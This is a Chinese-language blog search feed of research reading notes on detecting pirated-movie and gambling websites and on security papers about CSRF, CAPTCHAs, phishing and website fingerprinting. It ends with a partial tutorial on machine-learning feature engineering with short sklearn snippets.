<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>论文记录-盗版电影网站分析</title>
      <link href="/2022/02/23/%E8%AE%BA%E6%96%87%E8%AE%B0%E5%BD%95-%E7%9B%97%E7%89%88%E7%94%B5%E5%BD%B1%E7%BD%91%E7%AB%99%E5%88%86%E6%9E%90/"/>
      <url>/2022/02/23/%E8%AE%BA%E6%96%87%E8%AE%B0%E5%BD%95-%E7%9B%97%E7%89%88%E7%94%B5%E5%BD%B1%E7%BD%91%E7%AB%99%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="盗版电影网站分析"><a href="#盗版电影网站分析" class="headerlink" title="盗版电影网站分析"></a>盗版电影网站分析</h1><h2 id="论文内容"><a href="#论文内容" class="headerlink" title="论文内容"></a>论文内容</h2><h3 id="研究流程"><a href="#研究流程" class="headerlink" title="研究流程"></a>研究流程</h3><ol><li><strong>初步网页发现</strong>：使用搜索引擎直接对关键词列表进行搜索的方式，收集网页的标题、链接、获取时间、最后存活时间等信息，构建未分类网页数据库。</li><li><strong>网页识别</strong>：对步骤1中获取到的数据条目进行人工标注，使用监督学习训练模型进行自动化判别，记录模型预测结果以人为验证结果可靠性、网页是否已处理等，构建盗版电影网站数据库。在此过程中，可以进一步构建白名单数据库，提高网页发现的速度，降低冗余。</li><li><strong>二次网页发现</strong>：对于在步骤2中已被认定为盗版电影网站的网页，通过提取页面中的语料信息并再次利用搜索引擎进行搜索、根据网站运营主体的相关信息对其运营的其他网站进行访问等方式。</li><li><strong>资源列表提取和分析</strong>：提取盗版电影网站的资源列表，分析其规模、资源可访问性等，并进行统计和展示。</li><li><strong>同源性分析</strong>：包含对已知盗版电影网站的结构相似性分析（是否为同一框架）、内容同源性分析（是否为同一数据源）、域名同源性分析、运营主体同源性分析等。</li><li><strong>盈利手段分析</strong>：在源代码层面指明最显而易见的盈利方式，并在此基础上指出部分流氓网站暴力跳转广告所指向页面的方式，对各种盈利手段进行统计和展示。</li><li>分析和展示网页的其他特征，如域名特征（TLD分布）、运营主体邮箱统计、资源存储方式统计（local、remote server、CDN）。</li><li>运营趋势分析。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 科研相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文 </tag>
            
            <tag> 网站检测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文笔记-赌博网站检测</title>
      <link href="/2021/12/05/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0-%E8%B5%8C%E5%8D%9A%E7%BD%91%E7%AB%99%E6%A3%80%E6%B5%8B/"/>
      <url>/2021/12/05/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0-%E8%B5%8C%E5%8D%9A%E7%BD%91%E7%AB%99%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="总体流程"><a href="#总体流程" class="headerlink" title="总体流程"></a>总体流程</h1><p>下图总结了全文的分析方法。</p><ul><li>首先，我们从百度搜索引擎提供的一组URL开始，抓取每个URL的网页。</li><li>其次，我们建立了一个基于内容的分类器来自动区分赌博网页与正常网页。</li><li>第三，我们分析了用于推广这些赌博网站的网页以及方法。</li><li>第四，我们分析了赌博网页中的内容，统计其中涉及的赌博游戏类型。</li><li>最后，我们提取了赌博网站所使用的在线支付渠道、外包直播聊天服务和图像存储服务。</li></ul><p><img src="1.png" alt="系统总体架构"></p><h1 id="数据获取"><a href="#数据获取" class="headerlink" title="数据获取"></a>数据获取</h1><p>我们工作的第一个挑战是侦测非法赌博网站。这里主要有两个问题:检测非法赌博网页的准确性，以及如何获取用于检测的网页数据集，并确保其多样性(即代表性)。</p><p>我们获得了5万个非法赌博网页和5万个正常网页，作为我们检测的基准，作为data<sub>train</sub>。为了确保网页的多样性，我们与中国最大的搜索引擎百度合作，百度提供了1000万个由其爬虫程序索引的URL，我们抓取每个URL的HTML内容。我们将数据集标记为data<sub>total</sub>。</p>]]></content>
      
      
      <categories>
          
          <category> 科研相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文 </tag>
            
            <tag> 网站检测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>近期阅读文献汇总</title>
      <link href="/2021/11/28/%E8%BF%91%E6%9C%9F%E9%98%85%E8%AF%BB%E6%96%87%E7%8C%AE%E6%B1%87%E6%80%BB/"/>
      <url>/2021/11/28/%E8%BF%91%E6%9C%9F%E9%98%85%E8%AF%BB%E6%96%87%E7%8C%AE%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h1><h3 id="Automatic-Identification-of-Honeypot-Server-Using-Machine-Learning-Techniques"><a href="#Automatic-Identification-of-Honeypot-Server-Using-Machine-Learning-Techniques" class="headerlink" title="Automatic Identification of Honeypot Server Using Machine Learning Techniques"></a>Automatic Identification of Honeypot Server Using Machine Learning Techniques</h3><p>基于机器学习技术的蜜罐服务器自动识别</p><p>本文提出了一种基于随机森林算法的蜜罐自动识别模型，该模型具有三组特征:<strong>应用层特征、网络层特征和其他系统层特征</strong>。从公共已知平台采集实验数据集，设计实验数据集来验证该模型的有效性。</p><p>对于低交互的“蜜罐”，通过<strong>端口监听模拟的服务</strong>可以很容易地远程检测到。但是对于高交互的“蜜罐”，服务完全使用本地程序进行部署。由于许多高交互性的“蜜罐”总是部署<strong>防火墙和IDS</strong>，因此可以使用这些特性来快速检测。</p><h1 id="A-USENIX"><a href="#A-USENIX" class="headerlink" title="A-USENIX"></a>A-USENIX</h1><h2 id="30rd感兴趣部分"><a href="#30rd感兴趣部分" class="headerlink" title="30rd感兴趣部分"></a>30rd感兴趣部分</h2><h3 id="JAW-Studying-Client-side-CSRF-with-Hybrid-Property-Graphs-and-Declarative-Traversals-（学习和研究成本高，短期不现实）"><a href="#JAW-Studying-Client-side-CSRF-with-Hybrid-Property-Graphs-and-Declarative-Traversals-（学习和研究成本高，短期不现实）" class="headerlink" title="JAW: Studying Client-side CSRF with Hybrid Property Graphs and Declarative Traversals （学习和研究成本高，短期不现实）"></a>JAW: Studying Client-side CSRF with Hybrid Property Graphs and Declarative Traversals （学习和研究成本高，短期不现实）</h3><p>使用混合属性图和声明式遍历研究客户端CSRF</p><p><strong>客户端CSRF</strong>是一种新型的CSRF漏洞，对手可以通过<strong>修改程序的输入参数来欺骗客户端JavaScript程序向易受攻击的目标站点发送伪造的HTTP请求</strong>。研究基于javascript的web应用程序中的客户端CSRF漏洞并不是一件容易的事情。首先，<strong>JavaScript代码没有规范的表示</strong>。其次，<strong>JavaScript程序是事件驱动的</strong>，我们需要模型来捕获这方面并将其合并到规范表示中。第三，<strong>纯静态分析通常不够精确</strong>，这是JavaScript程序的动态特性以及它们的执行环境导致的，<strong>需要混合静态-动态分析技术</strong>来解决。最后，<strong>JavaScript库构成了web页面中值得注意的一小部分代码</strong>，反复分析它们会导致检测模型过于低效。</p><p>在本文中提出<strong>混合属性图(hpg)<strong>来解决这些挑战，这是一种用于客户端JavaScript程序的一致的、基于图形的表示，可以捕获静态和动态程序行为。文章使用属性图来表示模型，并使用声明性图遍历来识别使用攻击者可控源的数据值的安全敏感的HTTP请求。此外，</strong>还提出了一个客户端CSRF检测框架JAW，它从一个种子URL开始，通过自动收集web资源和监控程序执行来实例化hpg</strong>。最后，实例化了针对stall的web应用程序来检测和研究客户端CSRF，总计覆盖了4,836个网页上超过228M行的JavaScript代码。总的来说，文章的方法发现了12701个影响87个web应用程序的伪造客户端请求。对于203个可伪造的请求，成功地针对7个web应用程序创建了客户端CSRF攻击，这些应用程序可以执行任意的<strong>服务器端状态改变操作</strong>，或者<strong>启用跨站点脚本和SQL注入</strong>，这些都是传统攻击无法达到的。最后，分析了可伪造的请求，并确定了25个不同的请求模板，突出了可以操作的字段和操作的类型。</p><h3 id="CACTI-Captcha-Avoidance-via-Client-side-TEE-Integration（提出代替验证码的一种新方法，涉及了比较生疏的TEE）"><a href="#CACTI-Captcha-Avoidance-via-Client-side-TEE-Integration（提出代替验证码的一种新方法，涉及了比较生疏的TEE）" class="headerlink" title="CACTI: Captcha Avoidance via Client-side TEE Integration（提出代替验证码的一种新方法，涉及了比较生疏的TEE）"></a>CACTI: Captcha Avoidance via Client-side TEE Integration（提出代替验证码的一种新方法，涉及了比较生疏的TEE）</h3><p>CACTI:通过客户端TEE集成避免验证码</p><p>防止机器人滥用web服务是一个日益重要的问题，因为滥用行为的数量和种类都在增长。验证码是阻止机器人活动的最常见方式。然而，<strong>它们通常对机器人无效，并且很烦人</strong>。此外，最近的一些验证码技术侵犯了用户的隐私。、客户端可信执行环境(TEEs)正变得越来越普遍(例如ARM的TrustZone和Intel的SGX)，允许在客户端硬件的一小部分(信任锚或TCB)建立信任。这就提出了一个问题:<strong>TEE能帮助减轻(或完全消除)用户解决验证码的负担吗?<strong>在本文中，</strong>通过客户端TEE集成设计了CACTI</strong>。使用客户端TEE,<strong>CACTI允许合法客户生成不可伪造的证明，证明他们执行特定操作的频率低于服务器设定的阈值。这些速率证明可以发送到网络服务器，用来代替验证码</strong>。CACTI提供了强大的客户隐私保障，因为信息只发送到访问的网站，并使用<strong>组签名方案</strong>进行身份验证。评估表明，生成和验证CACTI速率证明的总体延迟小于0.25秒，而CACTI的带宽开销比当前的CAPTCHA系统低98%以上。</p><h3 id="Can-I-Take-Your-Subdomain-Exploring-Same-Site-Attacks-in-the-Modern-Web（域）"><a href="#Can-I-Take-Your-Subdomain-Exploring-Same-Site-Attacks-in-the-Modern-Web（域）" class="headerlink" title="Can I Take  Your Subdomain? Exploring Same-Site Attacks in the Modern Web（域）"></a>Can I Take  Your Subdomain? Exploring Same-Site Attacks in the Modern Web（域）</h3><p>我能拿下你的子域名吗?探索现代Web中的同站点攻击</p><p>关联域攻击者通过其已经控制的兄弟域来对目标域的web应用进行攻击。尽管它们比传统的网络攻击者更强大，但很少被研究者关注。在本文中，我们首次<strong>定义和量化了相关域攻击者对web应用安全构成的威胁</strong>。特别地，我们首先阐明了<strong>相关域攻击者通过不同的攻击向量可以获得的能力</strong>，表明了相关域攻击者概念是值得关注的。然后，我们通过关注不同的角度，包括cookie、CSP、CORS、postMessage和domain relaxation，来研究如何滥用这些功能来危害web应用程序的安全。通过构建这个框架，我们进行了对Tranco列表中排名前50k的域进行的大规模安全测量，发现了887个站点的漏洞，量化了相关域攻击者对流行web应用程序造成的威胁。</p><h3 id="LZR-Identifying-Unexpected-Internet-Services（端口服务识别）★★★"><a href="#LZR-Identifying-Unexpected-Internet-Services（端口服务识别）★★★" class="headerlink" title="LZR: Identifying Unexpected Internet Services（端口服务识别）★★★"></a>LZR: Identifying Unexpected Internet Services（端口服务识别）★★★</h3><p>LZR:识别意外的互联网服务</p><p>互联网范围的扫描是一种常用的研究技术，它有助于发现现实世界的攻击，找到密码弱点，并了解操作者和不法行为。使用扫描的研究在很大程度上假定服务托管在它们的IANA分配的端口上，而忽略了对非正常端口上的服务的研究。在这项工作中，我们调查了互联网服务的部署位置，并评估了服务<strong>在意外端口上的安全态势</strong>。我们发现，协议部署比以前认为的更加分散，<strong>协议运行在IANA分配的端口之外的许多其他端口上</strong>。例如，<strong>只有3%的HTTP服务和6%的TLS服务在端口80和443上运行</strong>。<strong>非标准端口上的服务更有可能是不安全的</strong>，这导致研究极大地低估了互联网主机的安全态势。基于我们的观察，我们引入了LZR(“Laser”)，该系统<strong>可以在5次握手中识别99%的可识别的意外服务，并显著减少了在预期服务响应较少的端口上执行应用程序层扫描所需的时间</strong>(例如，在27017/MongoDB上加速5500%)。最后，我们对未来的研究提出了建议。</p><h3 id="Research-on-the-Security-of-Visual-Reasoning-CAPTCHA（研究推理型验证码的安全性）"><a href="#Research-on-the-Security-of-Visual-Reasoning-CAPTCHA（研究推理型验证码的安全性）" class="headerlink" title="Research on the Security of Visual Reasoning CAPTCHA（研究推理型验证码的安全性）"></a>Research on the Security of Visual Reasoning CAPTCHA（研究推理型验证码的安全性）</h3><p>视觉推理验证码的安全性研究</p><p>验证码是保护计算机免受恶意机器人攻击的有效机制。随着深度学习技术的发展，目前主流的基于文本的验证码已经被证明是不安全的。因此，<strong>基于图像的验证码</strong>(captcha)的开发已成为一项重要的工作，而<strong>基于图像的视觉推理</strong>正在成为这一发展的一个新方向。最近，<strong>腾讯部署了可视化图灵测试(VTT)验证码</strong>。这似乎是<strong>视觉推理方案</strong>的第一次应用。随后，其他的验证码服务提供商(Geetest、网易、鼎翔等)都提出了自己的视觉推理方案来抵御机器人。因此，很自然地会问一个基本的问题:<strong>视觉推理验证码是否如设计者所期望的那样安全?<strong>本文首次尝试解决视觉推理验证码。我们实现了整体攻击和模块化攻击，在VTT CAPTCHA上的总体成功率分别为67.3%和88.0%。结果表明，</strong>视觉推理验证码并不像预期的那样安全</strong>;这一最新的尝试使用新颖的、困难的人工智能问题来解决验证码，但尚未成功。基于我们从攻击中得到的教训，我们还提供了一些设计具<strong>有更好安全性的可视化验证码的指导方针</strong>。</p><h3 id="Phishpedia-A-Hybrid-Deep-Learning-Based-Approach-to-Visually-Identify-Phishing-Webpages（深度学习图像识别检测钓鱼网站）"><a href="#Phishpedia-A-Hybrid-Deep-Learning-Based-Approach-to-Visually-Identify-Phishing-Webpages（深度学习图像识别检测钓鱼网站）" class="headerlink" title="Phishpedia: A Hybrid Deep Learning Based Approach to Visually Identify Phishing Webpages（深度学习图像识别检测钓鱼网站）"></a>Phishpedia: A Hybrid Deep Learning Based Approach to Visually Identify Phishing Webpages（深度学习图像识别检测钓鱼网站）</h3><p>Phishpedia:一种基于深度学习的视觉识别钓鱼网页的混合方法</p><p>近年来，针对网络钓鱼攻击的检测和识别方法得到了发展。网络钓鱼检测方案经常只说明某网站是否是钓鱼网站，但没有任何解释。相比之下，网络钓鱼识别方法<strong>通过视觉方式比较预定义的合法引用的网页来识别网络钓鱼网页</strong>，并报告其目标品牌，从而得到可以解释的结果。然而，<strong>可视化分析中存在一些技术挑战</strong>，这些挑战限制了现有解决方案的有效性(高准确性)和高效率(低运行时开销)，无法付诸实际使用。在这项工作中，我们设计了一个<strong>混合深度学习系统Phishpedia</strong>，以解决钓鱼识别中的两个突出的技术挑战，即(i)准确识别<strong>网页截图上的身份标识</strong>，(ii)匹配<strong>同一品牌的不同标识</strong>。Phishpedia实现了高准确性和低运行开销。非常重要的是，不同于一般的方法，Phishpedia不需要训练任何钓鱼样本。我们使用真实的网络钓鱼数据进行了大量的实验;结果表明，Phishpedia在准确有效地识别钓鱼页面方面显著优于其他识别方法(EMD、PhishZoo和LogoSENSE)。我们还部署了带有CertStream服务的Phishpedia，在30天内发现了1704个新的真正的钓鱼网站，远远多于其他解决方案。</p><h2 id="29rd感兴趣部分"><a href="#29rd感兴趣部分" class="headerlink" title="29rd感兴趣部分"></a>29rd感兴趣部分</h2><h3 id="Shim-Shimmeny-Evaluating-the-Security-and-Privacy-Contributions-of-Link-Shimming-in-the-Modern-Web（链接漂移，可以依照本文方法研究twitter）★★★"><a href="#Shim-Shimmeny-Evaluating-the-Security-and-Privacy-Contributions-of-Link-Shimming-in-the-Modern-Web（链接漂移，可以依照本文方法研究twitter）★★★" class="headerlink" title="Shim Shimmeny: Evaluating the Security and Privacy Contributions of Link Shimming in the Modern Web（链接漂移，可以依照本文方法研究twitter）★★★"></a>Shim Shimmeny: Evaluating the Security and Privacy Contributions of Link Shimming in the Modern Web（链接漂移，可以依照本文方法研究twitter）★★★</h3><p>Shim shimmy:评估链接漂移在现代网络中的安全和隐私贡献</p><p>链接漂移(也称为URL包装)是一种被网站广泛使用的技术，其中<strong>网站上的URL被重写，在重定向到原始目的地之前将链接导航指向一个中间端点进行分析</strong>。<strong>这种URL点击的“移动”可以实现导航安全、隐私和分析的目的</strong>，并且已经被知名网站(如Facebook、<strong>Twitter</strong>、微软、谷歌)部署了十多年。当然，我们对它在安全和隐私方面的贡献缺乏深入的了解，特别是在当今的网络生态系统中，<strong>现代浏览器提供了潜在的替代机制来保护链接导航，而不需要花费链接漂移的成本</strong>。在本文中，我们使用Facebook的真实部署作为案例研究，对链接漂移的安全和隐私贡献进行了大规模的实证评估。我们的结果表明，<strong>即使在现代网络中，链接漂移也可以为广大用户提供有意义的安全和隐私利益</strong>。这些好处在我们观察到的大量传统浏览器客户端中最为显著，比如在主要使用移动设备上网的发展中国家。我们讨论了这些收益与潜在成本之间的权衡。除了链接漂移，我们的发现还为提高用户在线保护提供了见解，例如网络生态系统的责任分配，遗留软件场景，以及用户对网站安全警告的响应。</p><p>在本文中，我们通过在<strong>Facebook</strong>上部署链接漂移的案例研究来调查这个问题，提供了一个大规模的真实世界的评估，来评估用户如何使用链接漂移以及它在保护用户方面的有效性。首先，我们分析了一个月来漂移链接超过60亿次的点击量，并<strong>评估了在现代浏览器隐私机制下，漂移链接所带来的隐私收益</strong>。然后，我们评估用户在同一时期遇到的328M链接警告是如何工作的，这些警告旨在保护他们<strong>免受恶意目的地的攻击</strong>。</p><h3 id="Zero-delay-Lightweight-Defenses-against-Website-Fingerprinting"><a href="#Zero-delay-Lightweight-Defenses-against-Website-Fingerprinting" class="headerlink" title="Zero-delay Lightweight Defenses against Website Fingerprinting"></a>Zero-delay Lightweight Defenses against Website Fingerprinting</h3><p>零延迟轻量级防御网站指纹</p><p>网站指纹(Website Fingerprinting, WF)攻击威胁到匿名网络上用户的隐私，因为<strong>网络监控人员可以通过提取网络流量的特征来识别正在访问的网页</strong>。为了减轻WF的威胁，已经提出了许多防御措施，但它们都有缺陷:<strong>一些被更强的WF攻击击败，一些开销太大，而其他的部署不切实际</strong>。在这项工作中，<strong>我们提出了两种新的零延迟轻量级防御，FRONT和GLUE</strong>。我们发现WF攻击依赖于特性丰富的跟踪前端，因此<strong>FRONT重点关注用虚拟数据包混淆跟踪前端</strong>。它还随机化了虚拟包的<strong>数量和分布</strong>，以实现跟踪随机性，以阻止攻击者的学习过程。<strong>GLUE在不同的跟踪之间添加了虚拟包</strong>，这样攻击者就会觉得它们是一条长而连续的跟踪，攻击者就无法找到它们的起点或终点，更不用说对它们进行分类了。我们的实验表明，在33%的数据开销下，FRONT优于最著名的轻量级防御，WTF-PAD，后者具有类似的数据开销。GLUE使用大约22%-44%的数据开销，可以降低最佳WF攻击的准确性和精度，其程度可与最重量级的防御相媲美。这两种防御都没有延迟开销。</p><p>随着人们越来越多地利用互联网进行工作和娱乐，网络监控也相应地成为对人们隐私的普遍威胁。<strong>Tor是一种基于洋葱路由的匿名网络</strong>，它通过保护网页浏览用户不被网络窃听而成为最流行的隐私增强技术之一。为此，它通过多个志愿代理转发用户信息包，这样网络监控人员就无法看到信息包的真实来源和目的地。在过去的十年中，多项研究表明<strong>Tor很容易受到网站指纹(website fingerprint, WF)的攻击</strong>。WF是一种流量分析攻击，即本地攻击者被动地窃听网络流量，从而发现客户端访问的是哪个网页。<strong>WF攻击者会观察数据包的模式，如发送和接收数据包的数量、数据包速率、数据包定时和数据包</strong>。<strong>使WF攻击特别具有威胁性的是，本地被动窃听者(可能是客户机的ISP)实际上不可能被检测到</strong>。为了对抗WF攻击，多年来已经提出了许多防御方法，但Tor或任何其他隐私增强技术都没有采用这些方法。这是因为它们的数据开销可能太高;他们可能<strong>延迟太高</strong>，损害用户体验;它们可能很难在现实中实现，<strong>依赖于无法提供的额外基础设施</strong>;或者它们可能只是在面对最强的攻击时无效。随着越来越多强大的攻击被发现，针对WF问题的防御变得越来越紧迫。</p><h1 id="B-ACSAC"><a href="#B-ACSAC" class="headerlink" title="B-ACSAC"></a>B-ACSAC</h1><h2 id="20th感兴趣部分"><a href="#20th感兴趣部分" class="headerlink" title="20th感兴趣部分"></a>20th感兴趣部分</h2><h3 id="Security-Study-of-Service-Worker-Cross-Site-Scripting（研究型问题，短期不现实）"><a href="#Security-Study-of-Service-Worker-Cross-Site-Scripting（研究型问题，短期不现实）" class="headerlink" title="Security Study of  Service Worker Cross-Site Scripting（研究型问题，短期不现实）"></a>Security Study of  Service Worker Cross-Site Scripting（研究型问题，短期不现实）</h3><p>针对Service Worker跨站点脚本的安全性研究</p><p>如今，现代网站正在利用service worker为用户提供<strong>类似app的功能</strong>，如离线模式、推送通知等。为了处理这些特性，<strong>service worker配备了特殊的特权</strong>，包括HTTP流量操纵。因此，它被设计为安全优先级。然而，我们发现许多网站引入了一个有问题的做法，可能危及service worker的安全。在本文中，我们将演示这种做法<strong>如何导致service worker内部的跨站点脚本(XSS)攻击，从而允许攻击者获得和利用service worker特权</strong>。由于这些特权的唯一性，与典型的XSS攻击相比，此类攻击可能导致更严重的后果。我们将这种类型的漏洞称为基于Service Worker的跨站点脚本(SW-XSS)。为了评估真实世界的安全影响，我们开发了一个名为<strong>SW-Scanner的工具</strong>，并使用它来分析热门网站。我们的发现揭示了一个令人担忧的趋势。我们总共发现了40个容易受到攻击的网站，其中包括一些热门和排名高的网站。最后，我们讨论了缓解SW-XSS漏洞的潜在防御解决方案。</p><p>通常，web浏览器会强制执行一些规则，以确保service worker不会受到外界的篡改。例如，只允许将同源文件注册为service worker。尽管有现有的安全措施，我们还是发现了一个新的XSS漏洞，<strong>该漏洞允许外部源在service worker内部执行恶意代码</strong>。这些网站通常安装一个<strong>带有URL搜索参数的service worker</strong>作为内部配置，<strong>在service worker内部盲目地信任这些参数</strong>。当恶意参数被提供并到达敏感函数时，它允许攻击者执行跨站点脚本并危害service worker。我们将这种类型的漏洞称为基于Service Worker的跨站点脚本(SW-XSS)。与其他类型的XSS不同，SW-XSS攻击者不一定利用网页的脆弱参数。相反，它们以service worker的脆弱参数为目标，并从service worker获得其他XSS攻击者无法获得的额外功能。</p><h3 id="Casino-Royale-A-Deep-Exploration-of-Illegal-Online-Gambling（网站分类与分析）★★★"><a href="#Casino-Royale-A-Deep-Exploration-of-Illegal-Online-Gambling（网站分类与分析）★★★" class="headerlink" title="Casino Royale: A Deep Exploration of Illegal Online Gambling（网站分类与分析）★★★"></a>Casino Royale: A Deep Exploration of Illegal Online Gambling（网站分类与分析）★★★</h3><p>皇家赌场:非法在线赌博的深度探索</p><p>网络赌博的流行会带来负面的社会影响，许多国家禁止或限制网络赌博。以中国为例，网上赌博违反中国法律，是非法的。然而，尽管有严格的限制，非法在线赌博网站仍然蓬勃发展，因为他们能够通过<strong>诱骗和欺骗</strong>在线玩家来获取巨额非法利润。本文首次对中国非法网络赌博进行了深入分析，揭示了其利润链。在成功识别出超过967954个可疑的非法赌博网站后，我们从<strong>网页结构相似性、搜索引擎优化方法、互联网基础设施滥用、第三方在线支付、赌博集团五个方面</strong>对这些非法赌博网站进行了检查。然后我们对非法赌博网站的<strong>利润链</strong>进行了测量研究，对这些非法赌博网站的上下游进行了调查。我们主要关注<strong>推广策略</strong>，第三方在线支付，第三方直播聊天服务滥用，以及网络基础设施。我们的发现揭示了在线赌博的生态系统，并帮助安全社区阻止非法在线赌博。</p><p><strong>文章分析了在线支付、网页或APP广告推广、云服务、网站引流策略来分析赌博网站，进行了使用SVM的机器学习识别，主要是使用了自然语言处理来分析网页内的文字信息。在得到很多赌博网站后，又对网站特征进行了分析，例如域名特征、所托管的服务商等。</strong></p><h1 id="C-TrustCom"><a href="#C-TrustCom" class="headerlink" title="C-TrustCom"></a>C-TrustCom</h1><h2 id="19th感兴趣部分"><a href="#19th感兴趣部分" class="headerlink" title="19th感兴趣部分"></a>19th感兴趣部分</h2><h3 id="Malware-Classification-on-Imbalanced-Data-through-Self-Attention（不平衡数据集）"><a href="#Malware-Classification-on-Imbalanced-Data-through-Self-Attention（不平衡数据集）" class="headerlink" title="Malware Classification on Imbalanced Data through Self-Attention（不平衡数据集）"></a>Malware Classification on Imbalanced Data through Self-Attention（不平衡数据集）</h3><p>基于自我注意的不平衡数据恶意软件分类</p><p>应该比较水，就是利用了提取汇编文件的操作码、词频特征来将恶意代码识别转换为一个自然语言处理问题，并且使用“自我注意机制”来使模型能够在不平衡的数据集上有良好的表现。</p><p> 对于自我注意，三个矩阵q (Query)，K(Key)， V(Value)来自同一个输入。首先，我们需要<strong>计算Q和K之间的点积</strong>，然后<strong>为了防止结果太大，它将除以一个标度√dk</strong>，其中是查询的维数和键向量。然后<strong>利用Softmax操作将结果归一化为概率分布</strong>。然后<strong>将softmax的结果乘以矩阵v，得到加权的摘要表示</strong>。该操作可表示为:注意(Q, K, V) =sof tmax(QKT/√dk)V(1)对于不平衡样本下恶意软件族的分类，我们提出的自我注意神经网络模型如图3所示。</p><h3 id="Traffic-Classification-of-User-Behaviors-in-Tor-I2P-ZeroNet-Freenet（可以参考模型介绍的写作）"><a href="#Traffic-Classification-of-User-Behaviors-in-Tor-I2P-ZeroNet-Freenet（可以参考模型介绍的写作）" class="headerlink" title="Traffic Classification of User Behaviors in Tor, I2P, ZeroNet, Freenet（可以参考模型介绍的写作）"></a>Traffic Classification of User Behaviors in Tor, I2P, ZeroNet, Freenet（可以参考模型介绍的写作）</h3><p>Tor、I2P、ZeroNet、Freenet中的用户行为流分类</p><p>怎么说呢……C刊确实水很多，<strong>全文基本上工作量全在数据收集和打标签</strong>，机器学习部分水模型介绍和评估参数的计算公式……</p><h3 id="Phishing-Web-Page-Detection-Using-Optimised-Machine-Learning（可以参考特征提取的写作）"><a href="#Phishing-Web-Page-Detection-Using-Optimised-Machine-Learning（可以参考特征提取的写作）" class="headerlink" title="Phishing Web Page Detection Using Optimised Machine Learning（可以参考特征提取的写作）"></a>Phishing Web Page Detection Using Optimised Machine Learning（可以参考特征提取的写作）</h3><p>调参炼丹</p><h2 id="18th感兴趣部分"><a href="#18th感兴趣部分" class="headerlink" title="18th感兴趣部分"></a>18th感兴趣部分</h2><h3 id="A-survey-of-research-on-CAPTCHA-designing-and-breaking-techniques（综述）"><a href="#A-survey-of-research-on-CAPTCHA-designing-and-breaking-techniques（综述）" class="headerlink" title="A survey of research on CAPTCHA designing and breaking techniques（综述）"></a>A survey of research on CAPTCHA designing and breaking techniques（综述）</h3><p>验证码设计与破解技术研究综述</p><p>首先从可用性、稳健性以及它们的优缺点方面对每种CAPTCHA类型的最新发展进行了全面的调查。其次，总结了每种类型的攻击方法。此外，还将讨论三种CAPTCHA类别和攻击方法之间的差异。最后，本文对未来的研究提出了建议，并提出了一些值得进一步研究的问题。</p><h3 id="Phishing-URL-Detection-via-CNN-and-Attention-Based-Hierarchical-RNN"><a href="#Phishing-URL-Detection-via-CNN-and-Attention-Based-Hierarchical-RNN" class="headerlink" title="Phishing URL Detection via CNN and Attention-Based Hierarchical RNN"></a>Phishing URL Detection via CNN and Attention-Based Hierarchical RNN</h3><p>调参炼丹，利用几个本文新提出的函数来进行处理，套用CNN、RNN、3层网络来进行基于自然语言处理所得向量的学习。特点是数据集为本文自主收集和标注，周期太长。</p>]]></content>
      
      
      <categories>
          
          <category> 科研相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>监督机器学习基本流程记录</title>
      <link href="/2021/10/28/%E7%9B%91%E7%9D%A3%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/10/28/%E7%9B%91%E7%9D%A3%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h1><h2 id="分类变量的编码方式"><a href="#分类变量的编码方式" class="headerlink" title="分类变量的编码方式"></a>分类变量的编码方式</h2><h3 id="one-hot编码"><a href="#one-hot编码" class="headerlink" title="one-hot编码"></a>one-hot编码</h3><p>一个特征的不同类别中，只有一个取1，其余取0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> OneHotEncoder <span class="comment"># 使用OneHotEncoder进行变换</span></span><br><span class="line">encoder = OneHotEncoder(sparse=<span class="literal">False</span>) <span class="comment"># encoder.fit找到which_bin中的唯一值</span></span><br><span class="line">encoder.fit(which_bin) <span class="comment"># transform创建one-hot编码</span></span><br><span class="line">X_binned = encoder.transform(which_bin)</span><br></pre></td></tr></table></figure><h3 id="数字编码"><a href="#数字编码" class="headerlink" title="数字编码"></a>数字编码</h3><p>一个特征的不同分类用不同的数字表示</p><h2 id="特征分箱（离散化）"><a href="#特征分箱（离散化）" class="headerlink" title="特征分箱（离散化）"></a>特征分箱（离散化）</h2><p>可以使线性模型在连续数据上更为强大，对每一段分别拟合，而不是对全体特征拟合（这样只会产生一条直线）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bins = np.linspace(-<span class="number">3</span>, <span class="number">3</span>, <span class="number">11</span>) <span class="comment"># 在-3到3的范围中创建十个箱子</span></span><br><span class="line">which_bin = np.digitize(X, bins=bins) <span class="comment"># 将数据分箱</span></span><br></pre></td></tr></table></figure><h2 id="交互特征与多项式特征"><a href="#交互特征与多项式特征" class="headerlink" title="交互特征与多项式特征"></a>交互特征与多项式特征</h2><p>想要向分箱数据上的线性模型添加斜率，一种方法是重新加入原始特征。（会获得全局单一斜率）；另一种方式是添加交互特征或乘积特征，用来表示数据点所在的箱子以及数据点在 x 轴上的位置。这个特征是箱子指示符与原始特征的乘积（会获得每个箱子有不同的斜率）。</p><h2 id="自动化特征选择"><a 